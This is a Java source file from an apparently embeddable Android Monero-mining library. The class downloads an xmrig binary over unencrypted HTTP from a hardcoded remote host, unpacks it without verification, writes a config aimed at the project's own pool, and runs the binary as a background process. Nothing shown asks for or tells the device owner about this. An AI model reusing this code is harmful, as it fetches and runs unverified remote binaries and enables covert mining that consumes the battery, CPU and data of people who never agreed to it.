package waterhole.miner.monero;

import android.annotation.TargetApi;
import android.content.Context;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectStreamException;

import waterhole.miner.core.utils.FileUtils;

import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
import static waterhole.miner.core.utils.FileUtils.downloadFile;
import static waterhole.miner.core.utils.FileUtils.unzip;
import static waterhole.miner.core.utils.IOUtils.closeSafely;
import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.core.utils.LogUtils.error;
import static java.lang.System.lineSeparator;
import static android.text.TextUtils.split;

public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {

    private static final String MINER_FILENAME = "/xmr-miner-old.zip";
    // todo kzw 目前为测试接口
    private static final String MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";

    private Context mContext;
    private Process mProcess;
    private OutputReaderThread mOutputHandler;

    private int mThreads;
    private int mCpuUses;
    private String mWalletAddress;

    private int mAccepted;
    private String mSpeed = "./.";

    private OldXmr() {
    }

    public static OldXmr instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static OldXmr instance = new OldXmr();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    private String getProgramRunDir() {
        return mContext.getFilesDir().getAbsolutePath();
    }

    public void startMine(Context context, int threads, int cpuUses, String walletAddress) {
        mContext = context;
        mThreads = threads;
        mCpuUses = cpuUses;
        mWalletAddress = walletAddress;
        executeOnThreadPool(new Runnable() {
            @Override
            public void run() {
                downloadFile(MINER_DOWNLOAD_URL, getProgramRunDir() + MINER_FILENAME,
                        OldXmr.this);
            }
        });
    }

    public void stopMine() {
        if (mOutputHandler != null) {
            mOutputHandler.interrupt();
            mOutputHandler = null;
        }
        if (mProcess != null) {
            mProcess.destroy();
            mProcess = null;
        }
    }

    @Override
    public void onDownloadSuccess(String pathName) {
        // 旧版门罗挖矿文件
        final String fileDir = getProgramRunDir();
        boolean xmrigExist = new File(fileDir + "/xmrig").exists();
        boolean uvExist = new File(fileDir + "/libuv.so").exists();
        boolean cplusExist = new File(fileDir + "/libc++_shared.so").exists();

        info("xmrig exist: " + xmrigExist + " ,libuv.so exist: " + uvExist
                + " ,libc++_shared.so exist: " + cplusExist);
        if (!xmrigExist || !uvExist || !cplusExist) {
            unzip(pathName, fileDir, this);
        } else {
            onUnzipComplete(pathName);
        }
    }

    @Override
    public void onDownloadFail(String path, String reason) {
        info("download old miner fail: " + reason);
    }

    @Override
    public void onUnzipComplete(String path) {
        info("unzip old miner success");

        if (mProcess != null) {
            mProcess.destroy();
        }
        // write the config
        writeConfig(mThreads, mCpuUses, mWalletAddress);
        try {
            // run xmrig using the config
            String[] args = {"./xmrig"};
            ProcessBuilder pb = new ProcessBuilder(args);
            // in our directory
            pb.directory(mContext.getFilesDir());
            // with the directory as ld path so xmrig finds the libs
            pb.environment().put("LD_LIBRARY_PATH", getProgramRunDir());
            // in case of errors, read them
            pb.redirectErrorStream();

            mAccepted = 0;
            // run it!
            mProcess = pb.start();
            // start processing xmrig's output
            mOutputHandler = new OutputReaderThread(mProcess.getInputStream());
            mOutputHandler.start();
        } catch (Exception e) {
            error("exception:", e);
            mProcess = null;
        }
    }

    @Override
    public void onUnzipFail(String path, String reason) {
        info("unzip old miner fail: " + reason);
    }

    @Override
    public void onUnzipEntryFail(String path, String reason) {
        info("unzip old miner entry fail: " + reason);
    }

    private void writeConfig(int threads, int cpuUses, String walletAddress) {
        String config = "{\n" +
                "         \"algo\": \"cryptonight\",\n" +
                "         \"av\": 0,\n" +
                "         \"background\": false,\n" +
                "         \"colors\": false,\n" +
                "         \"cpu-affinity\": null,\n" +
                "         \"cpu-priority\": 2,\n" +
                "         \"donate-level\": 0,\n" +
                "         \"log-file\": null,\n" +
                "         \"max-cpu-usage\": " + cpuUses + ",\n" +
                "         \"print-time\": 60,\n" +
                "         \"retries\": 5000,\n" +
                "         \"retry-pause\": 5,\n" +
                "         \"safe\": false,\n" +
                "         \"syslog\": false,\n" +
                "         \"threads\": " + threads + ",\n" +
                "         \"pools\": [\n" +
                "         {\n" +
                "         \"url\": \"xmr.waterhole.xyz:3333\",\n" +
                "         \"user\": \"" + walletAddress + "\",\n" +
                "         \"pass\": \"x\",\n" +
                "         \"keepalive\": true,\n" +
                "         \"nicehash\": false\n" +
                "         }\n" +
                "         ]\n" +
                "         }";
        info(config);
        FileOutputStream outStream = null;
        try {
            File file = new File(getProgramRunDir() + "/config.json");
            outStream = new FileOutputStream(file);
            outStream.write(config.getBytes());
        } catch (Exception e) {
            error("exception:", e);
        } finally {
            closeSafely(outStream);
        }
    }

    @TargetApi(19)
    private final class OutputReaderThread extends Thread {

        private final InputStream inputStream;
        private final StringBuilder output;
        private BufferedReader reader;

        OutputReaderThread(InputStream inputStream) {
            this.inputStream = inputStream;
            this.output = new StringBuilder();
        }

        public void run() {
            try {
                String line;
                reader = new BufferedReader(new InputStreamReader(inputStream));
                while ((line = reader.readLine()) != null) {
                    output.append(line + lineSeparator());
                    if (line.contains("accepted")) {
                        mAccepted++;
                    } else if (line.contains("speed")) {
                        String[] split = split(line, " ");
                        mSpeed = split[split.length - 2];
                    }
                    info("accepted = " + mAccepted + " ,speed = " + mSpeed);
                }
            } catch (IOException e) {
                error("exception", e);
            }
        }

        public StringBuilder getOutput() {
            return output;
        }
    }
}
